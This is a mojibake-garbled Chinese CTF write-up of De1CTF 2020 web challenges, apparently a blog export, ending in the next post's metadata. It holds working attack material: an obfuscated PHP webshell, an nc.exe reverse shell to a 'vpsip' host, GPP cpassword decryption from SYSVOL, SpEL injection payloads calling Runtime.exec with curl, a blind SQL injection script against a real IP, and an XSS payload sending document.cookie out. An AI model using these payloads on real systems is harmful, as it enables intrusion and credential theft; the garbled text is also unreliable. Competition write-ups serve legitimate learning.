1&lt;?=$_=[]?&gt;&lt;?=$_=@\"$_\"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____='_'?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_])?&gt; å½“æ—¶è¿˜é¡ºæ‰‹nmapæ‰«äº†ä¸‹ 12345678910111213141516Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 13:27 CSTNmap scan report for 47.113.219.76Host is up (0.016s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp closed ssh80/tcp open http Microsoft IIS httpd 8.5 (PHP 7.2.29)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Unknown|_http-title: upload3389/tcp closed ms-wbt-serverService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 118.83 seconds ç„¶åæƒ³æŠ±éƒå¸ˆå‚…å¤§è…¿å¤±è´¥äº†â€¦åªèƒ½é è‡ªå·±äº†ã€‚å› ä¸ºé¢˜ç›®åŒä¸€ä¸ªipè¢«å‡ºæˆä¸¤ä¸ªé¢˜ï¼ŒåŸºæœ¬å¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥è¦ä¹ˆæ˜¯å•çº¯ææƒ,è¦ä¹ˆæ˜¯windowsåŸŸæ¸—é€ã€‚ è¿™é‡Œwindowsé¶æœºå…«æˆå°±æ˜¯ä¸ºäº†åŸŸæ¸—é€å‡†å¤‡çš„ã€‚ ç¡¬ç€å¤´çš®ä¸ç®¡3721å…ˆå¼¹ä¸ªshellå½“æ—¶æ ¹ç›®å½•æœ‰åˆ«çš„å¸ˆå‚…ä¼ çš„NC,é‚£å°±ä¸ç”¨æˆ‘è‡ªå·±ä¼ äº†ã€‚ 1.\\nc.exe vpsip port -e powershell è¿™æ ·ä¸è‡³äºåœ¨uploadsç›®å½•è¢«åˆ æ—¶ä¸¢æ‰æ‰€æœ‰shell.ç„¶åä¼ ä¸ªwinPEAS.exe è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚è¿™ä¸ªä¹Ÿæ˜¯åšhtbæ—¶å­¦åˆ°çš„è„šæœ¬ï¼Œä¸€èˆ¬æ˜¯ä¸ºäº†ææƒæ‰«æä¸‹ã€‚åŸºæœ¬ä¸Šèƒ½æ»¡è¶³éœ€æ±‚ã€‚ä¿¡æ¯é‡Œæœ‰ä¸€å¤„æ¯”è¾ƒæ˜æ˜¾ è„šæœ¬åˆ—å‡ºçš„ä¿¡æ¯ä¸­æœ‰ä¸€ä¸ªåŸŸç”¨æˆ·åå­—å¾ˆæ•æ„Ÿã€‚HintZip_Passä¸‹é¢å¼€å§‹æ‰‹åŠ¨ä¿¡æ¯æ”¶é›† å‚è€ƒè¿™ç¯‡æ–‡ç« åŸŸæ¸—é€æ€»ç»“ åŸŸï¼ˆDomainï¼‰æ˜¯ç›¸å¯¹å·¥ä½œç»„ï¼ˆWorkgroupï¼‰çš„æ¦‚å¿µï¼Œå½¢è±¡çš„è¯´ï¼ŒåŸŸå°±åƒä¸­å¤®é›†æƒï¼Œç”±ä¸€å°æˆ–æ•°å°åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼‰ç®¡ç†åŸŸå†…çš„å…¶ä»–è®¡ç®—æœº æ‰€ä»¥åŸŸæ¸—é€çš„æ ¸å¿ƒæ˜¯é€šè¿‡å¯æ§çš„åŸŸç”¨æˆ·ï¼Œæ”¶é›†å…¶ä¸­çš„å¯ç”¨ä¿¡æ¯ï¼Œè¿›ä¸€æ­¥åˆ©ç”¨å…¶ä»–æ¼æ´å‘å±•æ›´å¤šåŸŸç”¨æˆ·ã€‚æœ€åèƒ½æ‹¿åˆ°ç®¡ç†å‘˜çš„å“ˆå¸Œï¼ŒåŸºæœ¬å°±ç®—æ¸—é€å®Œæ•´äº†ã€‚ ipconfig /allå¯ä»¥ç¡®è®¤å¤„äºåŸŸç®¡ç†æ¨¡å¼ä¸­ 123456789101112PS C:\\Users\\Public&gt; net user &#x2F;domainnet user &#x2F;domainThe request will be processed at a domain controller for domain De1CTF2020.lab.User accounts for \\\\dc.De1CTF2020.lab-------------------------------------------------------------------------------Administrator De1CTF1 de1ta Guest HintZip_Pass krbtgt web The command completed successfully. æŸ¥è¯¢åŸŸç”¨æˆ·æ—¶ä¹Ÿèƒ½å¾—åˆ°è·ŸwinPEASä¸€æ ·çš„å…³äºåŸŸç”¨æˆ·çš„ä¿¡æ¯ã€‚å°è¯•net use 12345678910PS C:\\&gt; net usenet useNew connections will be remembered.Status Local Remote Network-------------------------------------------------------------------------------OK \\\\192.168.0.12\\Hint Microsoft Windows NetworkThe command completed successfully. å‘ç°\\\\192.168.0.12\\Hintã€‚ä¸”ç”±äºæˆ‘ä»¬åˆšåˆšæ˜¯å»ºç«‹çš„IPCç©ºé“¾æ¥ã€‚å› æ­¤å¯ä»¥æ— éœ€ç”¨æˆ·åå¯†ç è®¿é—®å®ƒã€‚(ä¸è¿‡æˆ‘åæ¥å†çœ‹æ—¶å‘ç°è¿™ä¸ªåœ°å€æ²¡äº†)net view\\\\192.168.0.12\\ä¹Ÿèƒ½å‘ç°æœ‰Hint,SYSVOL,NETLOGINå‡ ä¸ªç›®å½• ç›´æ¥pushd\\\\192.168.0.12\\Hintè¿›å…¥filesystem.å‘ç°äº†ä¸€ä¸ªflag1_and_flag2hint.zip åŸºäºæˆ‘ä»¬ç©çš„æ˜¯å¤šäººæ¸—é€ã€‚æ‰€ä»¥æœ€å¥½æŠŠå®ƒcopyåˆ°è‡ªå·±ç§å¯†çš„ä½ç½®ã€‚æˆ–è€…æŠŠå®ƒä»¥å…¶ä»–æ–‡ä»¶æ ¼å¼ä¿å­˜ä¸‹æ¥ã€‚(å› ä¸ºæˆ‘åœ¨æ€è€ƒå¦‚ä½•æŠŠå®ƒæ‹¿ä¸‹æ¥æ—¶åˆšå¥½åœ¨èšå‰‘çš„shellé‡Œå‘ç°åˆ«äººçš„zipæ–‡ä»¶2333)ç›´æ¥ä¸‹å¥½åˆ«äººçš„zipå,ç°åœ¨è¦ä¸€ä¸ªå¯†ç  è¿™é‡Œå°±ä½“ç°å‡ºä¿¡æ¯æ”¶é›†çš„é‡è¦æ€§äº†ã€‚å› ä¸ºæˆ‘ä»¬ä¹‹å‰å‘ç°å¯ä»¥ç”¨çš„æ–‡ä»¶å¤¹é™¤äº†Hintè¿˜æœ‰SYSVOL.æ‰€ä»¥æˆ‘é€‰æ‹©ç™¾åº¦åŸŸæ¸—é€ SYSVOLå¾—åˆ°è¿™ç¯‡æ–‡ç« åŸŸæ¸—é€â€”â€”åˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç åœ¨åŸŸä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„å…±äº«è·¯å¾„\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\ åŸŸç®¡ç†å‘˜åœ¨ä½¿ç”¨ç»„ç­–ç•¥æ‰¹é‡ç®¡ç†åŸŸå†…ä¸»æœºæ—¶ï¼Œå¦‚æœé…ç½®ç»„ç­–ç•¥çš„è¿‡ç¨‹ä¸­éœ€è¦å¡«å…¥å¯†ç ï¼Œé‚£ä¹ˆè¯¥å¯†ç ä¼šè¢«ä¿å­˜åˆ°å…±äº«æ–‡ä»¶å¤¹\\SYSVOLä¸‹ï¼Œé»˜è®¤æ‰€æœ‰åŸŸå†…ç”¨æˆ·å¯è®¿é—®ï¼Œè™½ç„¶å¯†ç é€šè¿‡AES 256è¿›è¡ŒåŠ å¯†ï¼Œå¯†é’¥æ˜¯å…¬å¼€åœ¨å¾®è½¯å®˜ç½‘çš„ã€‚ å‚è€ƒè¿™ç¯‡æ–‡ç« åŸŸæ¸—é€ï¼šGPP(Group Policy Preferences)æ¼æ´å¯ä»¥ä½¿ç”¨dir /s /a \\\\åŸŸæ§IP\\SYSVOL\\*.xmlæ¥å°è¯•åˆ—å‡ºå­˜åœ¨çš„xmldir /s /a \\\\192.168.0.12\\SYSVOL\\*.xmlå¾—åˆ°å®Œæ•´è·¯å¾„åè¯»å–ã€‚è¿™é‡Œè¯•äº†ä¸‹typeä¸è¡Œï¼Œgcä¸è¡Œã€‚ç”¨moreæˆäº†more \\\\192.168.0.12\\SYSVOL\\De1CTF2020.lab\\Policies\\{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}\\Machine\\Preferences\\Groups\\Groups.xml 123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;\"&gt;&lt;User clsid=\"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;\" name=\"HintZip_Pass\" image=\"2\" changed=\"2020-04-15 14:43:23\" uid=\"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08\" changeLogon=\"1\" noChange=\"0\" neverExpires=\"0\" acctDisabled=\"0\" userName=\"HintZip_Pass\"/&gt;&lt;/User&gt;&lt;/Groups&gt; è¿™ä¸ªcpasswordæ°å¥½æ˜¯å±äºHintZip_Passçš„ã€‚é‚£ä¹ˆæ ¹æ®ä¸Šæ–‡ï¼Œç”±äºç§é’¥æš´éœ²ã€‚åªè¦çŸ¥é“å…¬é’¥cpasswordå³å¯ç ´è§£ã€‚ kaliæœ‰ç°æˆçš„gpp-decrypt ç›´æ¥ç”¨gpp-decrypt uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08å°±æˆã€‚å¾—åˆ°å¯†ç åè§£å‡ºzipæ–‡ä»¶ è¿™é¢˜åšå®Œååç»­æç¤ºçœ‹éƒ½ä¸æƒ³çœ‹äº†.çœŸçš„æ˜¯éš¾.ä¸è¿‡æ”¶è·ç‰¹æŒºå¤šçš„ã€‚(ä»¥åæˆ‘ä¸€å®šå¥½å¥½å­¦æ¸—é€.jpg) calcæ˜¨å¤©æ¯”èµ›æ—¶æ²¡åšå‡ºæ¥â€¦ç¬¬äºŒå¤©zjyå¸ˆå‚…æ„é€ å‡ºäº†payloadã€‚æ‰æ„Ÿæ…¨è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ã€‚ æŠ“åŒ…å°±èƒ½å¾—åˆ°spel/calc?calc=çš„è·¯ç”±æç¤ºçš„è¿™ä¹ˆæ˜æ˜¾ï¼Œåªèƒ½æ˜¯spELçš„è¡¨è¾¾å¼æ³¨å…¥äº†ã€‚ä¸è¿‡ç®€å•FUZZä¸€ä¸‹ï¼Œå‘ç°æœä¸å…¶ç„¶æœ‰wafã€‚å¤§æ¦‚æœ‰è¿™äº›å…³é”®å­—å§ï¼Œ#,getClass, T( ,java.lang, new ,String,æƒ³è¦ç›´æ¥RCEå½“ç„¶ä¸è¡Œã€‚æ‰€ä»¥å¾—æ„é€  ç¬¬ä¸€æƒ³æ³•æ˜¯æŸ¥èµ„æ–™ï¼Œæ‰¾åˆ°ä¸å°‘å¸ˆå‚…åšcode-breakingæ—¶ç”¨åå°„è¿›è¡ŒspEL-RCEçš„payloadåŸæœ¬æ˜¯ 1Runtime.getRuntime().exec() é€šè¿‡åå°„ï¼Œæˆ‘ä»¬å°±èƒ½å·§å¦™åˆ©ç”¨åå°„æ„é€ å‡ºç±»ä¸æ–¹æ³•ã€‚ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚ 1String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"exec\",String.class).invoke(String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),\"curl xxxx\"); ä½†æ˜¯è¿™é‡ŒString,getClassæ²¡äº†ã€‚ä¸è¿‡ä¹Ÿæœ‰æ–¹æ³•ç»•è¿‡ä½¿ç”¨&#39;&#39;[&#39;class&#39;]æ•°ç»„ç›´æ¥ç»•è¿™æ˜¯å‚è€ƒSEAM2.3.1çš„ä¸€ä¸ªååºåŒ–payloadçš„æ”¹æ³• 1''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898') ç„¶è€Œpayloadæ‰“äº†ä¸€å‘å‘ç°æŠ¥é”™ã€‚ç„¶åå°±æ— è¯­äº†ã€‚è¿™æ—¶æƒ³èµ·æ¥,æŠ“åŒ…æ—¶å‘ç°headeré‡Œæœ‰openrasp,ä¼°è®¡æ˜¯ç›´æ¥ä»åº•å±‚æŠŠruntimeä¹‹ç±»çš„ç»™hookæ‰äº†ã€‚ ç„¶åéƒå¸ˆå‚…è¯´ä¸ç”¨æ‰§è¡Œå‘½ä»¤ä¹Ÿèƒ½è¯»ã€‚ä»”ç»†æƒ³æŒºæœ‰é“ç†çš„,ä¸ç„¶æ²¡å¿…è¦ç›´æ¥å‘Šè¯‰æˆ‘ä»¬flagåœ¨æ ¹ç›®å½•ä½†æ˜¯ç¡®å®javaå¤ªèœäº†â€¦ä¸‹é¢æ˜¯é˜Ÿå‹æ•™æˆ‘çš„æ–¹æ³•ã€‚ 1New java.io.BufferedReader(New java.io.FileReader(\"/flag\")).readLine() åŸæ¥åœ¨spELé‡Œæ˜¯ä¸åŒºåˆ†å…³é”®å­—å¤§å°å†™çš„â€¦é‚£ç›´æ¥ç”¨javaèƒ½è¯»æ–‡ä»¶çš„ç±»æ¥å°±è¡Œäº†â€¦Java è¯»æ–‡ä»¶çš„5ç§æ–¹å¼åŒç†ä¹Ÿå¯ 1New java.util.Scanner(New java.io.File(\"/flag\")).nextLine() javaæ˜¯çœŸçš„è¦å¥½å¥½ç ”ç©¶ä¸‹äº† ps:åœ¨æ¨é€é‡Œçœ‹åˆ°ä¸€ç¯‡æ–‡ç« æ°å¥½æåˆ°äº†De1è¿™é¢˜ã€‚æ‰å‘ç°dalaoç›´æ¥bypass openraspè¿›è¡ŒRCEäº†â€¦å‚è€ƒ:bypass openrasp SpEL RCE çš„è¿‡ç¨‹åŠæ€è€ƒåŸæ¥æ·±æŒ–spELçš„åº•å±‚è§£ææºç ï¼Œå¯å‘ç°ç©ºå­—ç¬¦èƒ½ç›´æ¥bypass.æ‰€ä»¥ï¼Œåˆå¯ä»¥äº§ç”Ÿå®Œå…¨ä¸ä¾èµ–newçš„å®ä¾‹åŒ–æ–¹æ³•.ç›´æ¥ç©ºå­—ç¬¦æ’è¿›è¢«è¿‡æ»¤çš„T(ä¸­å³å¯ ç”šè‡³è¿›ä¸€æ­¥ï¼Œè¿˜èƒ½é€šè¿‡ååºåˆ—åŒ–çš„æ€æƒ³,ä¸æ˜¾ç¤ºçš„åŠ è½½æ¶æ„ç±»,è¾¾æˆRCEã€‚orzåŸæ¥javaçš„å§¿åŠ¿è¿™ä¹ˆå¤šçš„ä¹ˆâ€¦ mixtureå¯ä»¥ä»»æ„ç™»å½•member.phpæ³¨é‡Šä¸­æœ‰ orderbyæµ‹äº†ä¸‹å‘ç°åº”è¯¥æ˜¯order by åçš„è¯­å¥å¼€å§‹ä»¥ä¸ºåªèƒ½æ¥limité‚£æœ‰ä¸”ä»…æœ‰procedure analyseä¸€ç§æ–¹æ³•ä½†æŠ¥é”™å‡½æ•°éƒ½æ²¡äº†ã€‚å»¶æ—¶å»¶ä¸äº†ã€‚ç‰ˆæœ¬é—®é¢˜åªèƒ½ç”¨5.6ä»¥ä¸‹çš„å‡½æ•°ã€‚çœŸå¿ƒæ²¡æ‰‹æ®µäº†æˆ‘æœ‰ç½ªï¼Œè¿™ç§éš¾åº¦çš„sqlè¢«å¡ä½ã€‚è¯¥æ‰“ã€‚ ç›´æ¥and åˆ†æµæˆ‘å±…ç„¶ä¼šå¿˜äº†ã€‚ 1234567891011121314151617181920import requestsimport urllib.parseurl='http://134.175.185.244/member.php?orderby='flag=\"\"for i in range(1,30): print(i) a=0 for str1 in \"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890,\": payload = \"and case when (substr((select password from member),\"+str(i)+\",1)='\"+str1+\"') then (benchmark(500000,sha(1))) else 1 end\" payload = urllib.parse.quote(payload) try: r = requests.get(url + payload, timeout=2.5) except requests.exceptions.ReadTimeout: flag+=str1 print(flag) a=1 break if a==0: break æ±‚å¾—å¯†ç è§£å‡ºæ¥å¾—åˆ°goodlucktoyou è¿›å»åä¸€å¼€å§‹å‘ç°æœ‰ä¸€ä¸ªselect.phpä»»æ„è¯»æ–‡ä»¶çš„åŠŸèƒ½ä¸admin.phpç»™å‡ºçš„phpinfo,ä½†æ˜¯è¯»å®Œæºç åå‘ç°å±…ç„¶ä½¿ç”¨äº†Mincludeè¿™ä¸ªå‡½æ•°æ¥åŒ…å«ã€‚phpinfoé‡Œä¹Ÿèƒ½çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„soæ–‡ä»¶â€¦.æ‰€ä»¥è¿™é¢˜çœŸé¢ç›®æ˜¯WEB-PWN,åº”è¯¥æ˜¯é€šè¿‡è°ƒè¿™ä¸ªsoæ¥æº¢å‡ºæ‰§è¡Œæ ¹ç›®å½•çš„readflagâ€¦ ç„¶è€Œæ¯”èµ›å·²ç»å¿«ç»“æŸäº†ï¼Œç­‰äºç™½ç»™ã€‚ AnimalCrossingè¿™é¢˜ç­‰wpå§â€¦è€å®è¯´ä¸æƒ³å¤ç°äº†ã€‚å› ä¸ºé¢˜ç›®å¾—åˆ°flagé™¤äº†è¦å¼¹adminçš„cookie,è¿˜è¦ä»adminç•Œé¢çš„å›¾ç‰‡è·å–ä¿¡æ¯â€¦æ²¡è§è¿‡è¿™ä¹ˆç£¨äººçš„xss. 5.18å¤ç°: ä»Šå¤©æ•´ç†ä»“åº“æ—¶å¶ç„¶å‘ç°De1CTFè¿™ä¸ªé¢˜æ˜¯æœ‰dockerç¯å¢ƒçš„ã€‚äºæ˜¯å°±èµ·äº†ä¸ªç¯å¢ƒå°è¯•å¤ç°ä¸‹ã€‚å‘ç°å­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ã€‚ é¦–å…ˆç¬¬ä¸€æ­¥è‡ªç„¶æ˜¯åˆ©ç”¨é‚£ä¸ªå¯èƒ½è¾¾æˆxssçš„ç‚¹äº†ã€‚æœ¬é¢˜æ˜¯åœ¨è¿™ä¸ªurlä¸­çš„dataä½ç½® ä½†æ˜¯æ­¤å¤„self-xssçš„è¾¾æˆéƒ½ååˆ†å›°éš¾ã€‚å› ä¸ºä¸€æ–¹é¢å­˜åœ¨wafè¿‡æ»¤æ‰å­—ç¬¦(è¿™é‡Œå¦‚æœparseå¤±è´¥å›æ˜¾ä¹Ÿæ˜¯æŒ‰é‡åˆ°wafåˆ¤æ–­çš„,æ‰€ä»¥è¦æ³¨æ„è¯­æ³•çš„è§„èŒƒ)ã€‚åŒæ—¶è¿˜æœ‰ä¸ªCSP.default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;å½“ç„¶è¿™ä¸ªCSPå¾ˆå¥½ç»•ã€‚ä½¿ç”¨locationè¿™ä¸€ç±»å‹çš„è·³è½¬å°±å¯ä»¥äº†ã€‚éš¾ç‚¹åœ¨äºç»•wafè¾¾æˆåé¢çš„jsä»£ç æ‰§è¡Œã€‚ çœ‹åˆ°skyå¸ˆå‚…çš„wpåæ‰æç„¶å¤§æ‚Ÿã€‚(è†œä¸€å¶é£˜é›¶å¸ˆå‚…,è‡ªå·±å¾ˆå¤šçŸ¥è¯†éƒ½æ˜¯ä»ä»–çš„æ–‡ç« é‚£å­¦æ¥çš„).åŸæ¥æ˜¯å¯ä»¥åˆ©ç”¨jsçš„ä¸€ä¸ªtrick,è€Œä¸”è‡ªå·±æ›¾ç»å¤§æ¦‚æ¥è§¦è¿‡ã€‚ å…ˆè§£é‡Šä¸‹è¿™é‡Œçš„xssæ‰§è¡Œæˆ‘ä»¬çš„æ•°æ®å¯ä»¥ç›´æ¥é€šè¿‡urlä¸­dataå‚æ•°æ‹¼æ¥è¿›è¿™é‡Œçš„jsä»£ç ã€‚é¦–å…ˆè‡ªç„¶ä½¿ç”¨1&#39;//ä¿è¯ä»£ç è¯­æ³•çš„åˆæ³•æ€§ã€‚ä¹‹åè€ƒè™‘çš„å°±æ˜¯,æ€ä¹ˆæ ·åœ¨å•å¼•å·è·Ÿæ³¨é‡Šç¬¦ä¸­é—´è¿™éƒ¨åˆ†ä½¿ç”¨jsä»£ç ç»•è¿‡wafè¿›è¡Œxssã€‚äºæ˜¯è¿™é‡Œå°±è¦æåˆ°jsçš„ä¸€ä¸ªtrickäº†ã€‚å…ˆè§£é‡Šä¸‹skyå¸ˆå‚…çš„payloadã€‚å¯¹äºjsä¸­ä¸€ä¸ªå¯¹è±¡è€Œè¨€,å…¶valueOf()æ–¹æ³•ä¼šè¿”å›å¯¹è±¡æœ¬èº«ã€‚è€Œå½“æˆ‘ä»¬å°†å¯¹è±¡ä¸äºŒå…ƒè¿ç®—ç¬¦è¿›è¡Œæ“ä½œæ—¶,å°†ä¼šè°ƒç”¨valueofæ–¹æ³•ã€‚é‚£ä¹ˆè¿™æ ·å°±ç®€å•äº†,åªè¦èƒ½æ§åˆ¶valueOf()æ–¹æ³•è¿”å›å€¼,å°±èƒ½æ‰§è¡Œä»»æ„jsä»£ç ã€‚é‚£ä¹ˆæ­¤å¤„payloadå°±å¯ä»¥æ„é€ æˆ 1'+&#123;\"valueOf\":new \"\".construcor.constructor(atob('base64xsspayload'))&#125;+1// ä½¿ç”¨constructorè·å–åˆ°åŒ¿åå‡½æ•°è¿™ä¸ªåœ¨nodejsé‡Œå·²ç»éå¸¸ç†Ÿæ‚‰äº†ã€‚åŒæ—¶è¿™é‡Œ+1å°±å¯ä»¥ç›´æ¥è§¦å‘valueOf.æœ€åæˆ‘ä»¬ä¸ºäº†ç»•è¿‡wafä½¿ç”¨å§base64ç»•è¿‡ã€‚ å½“ç„¶ä½¿ç”¨å…¶ä»–æ–¹æ³•éƒ½å¯ä»¥ã€‚æˆ‘çœ‹è§æ¦œä¸€çš„mslcpayloadå¤§æ¦‚ä¹Ÿæ˜¯ç”¨äºŒå…ƒè¿ç®—ç¬¦åŠ ä¸Šbase64paylaodè¾¾æˆçš„ã€‚åªä¸è¿‡ç”¨çš„æ˜¯jsä¼ªåè®®ã€‚å½¢å¼ä¸Šç®€å•äº†è®¸å¤š 123payload&#x3D;javascript:&#123;window.location.href&#x3D;&quot;vpsip&#x2F;?&quot;+document.cookie&#125;data&#x3D;1&#39;%2bopen(atob(&#39;base64encodepaylaod&#39;))&#x2F;&#x2F; åé¢æ‰“ç»™adminæ”¶flagå› ä¸ºdockerç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆå†…ç½‘æœåŠ¡æ²¡èµ·æ¥,æ‰€ä»¥æ²¡æ³•ç»§ç»­å¤ç°äº†ã€‚åé¢å¤§è‡´çš„å†…å®¹å°±æ˜¯å‘ç°adminçš„é¡µé¢æœ‰ç…§ç‰‡,æ‰€ä»¥å¯ä»¥ä¸€ä¸ªä¸ªä¸‹ä¸‹æ¥æ‹¼å›¾å³å¯ã€‚(ç”¨åˆ°äº†ä¹‹å‰çš„pngbypassCSPçš„å†…å®¹) å°ç»“è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯å‡ ä¹å…¨ç¨‹è‡ªé—­ã€‚è™½ç„¶å¤§å®¶åº”è¯¥éƒ½å·®ä¸å¤šå§ã€‚è€Œä¸”æ²¡æƒ³åˆ°çš„æ˜¯è‡ªå·±å±…ç„¶æ˜¯WEBä¸»C,ä¼°è®¡ä»¥åä¹Ÿä¼šè¿™æ ·æ‰¿æ‹…èµ·æ¯”ä»¥å¾€æ›´å¤§çš„è´£ä»»äº†.å­¦é•¿ä»¬æ²¡æ‰“ï¼Œå°±åªèƒ½é è‡ªå·±ã€‚å¯èƒ½ä¸€ç›´ä»¥æ¥å¿ƒé‡Œè§‰å¾—æœ‰éƒç¦»æ­Œåœ¨,è¿™äº›é¢˜ç›®éƒ½ä¸æ˜¯äº‹çš„.ç„¶è€Œè¿™æ¬¡De1ç›´æ¥æ³¼äº†ä¸€å¤´å†·æ°´ï¼Œæé†’æˆ‘æœ€åè¿˜æ˜¯å¾—é è‡ªå·±ã€‚ç¡¬å®åŠ›æ‰æ˜¯ç‹é“ã€‚ é©¬ä¸Šç½‘é¼ä¹Ÿæ¥äº†ï¼Œè¿™æ®µæ—¶é—´äº‰å–æŠŠjavaå®‰å…¨èƒ½å…¥ä¸ªé—¨ï¼Œphpä»£å®¡è¿‡å®Œå§ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"PHP-Audit-Labså®¡è®¡å­¦ä¹ ","slug":"PHP-Audit-Labså®¡è®¡å­¦ä¹ ","date":"2020-04-27T14:53:31.000Z","updated":"2021-02-18T05:09:43.279Z","comments":true,"path":"2020/04/27/PHP-Audit-Labså®¡è®¡å­¦ä¹ 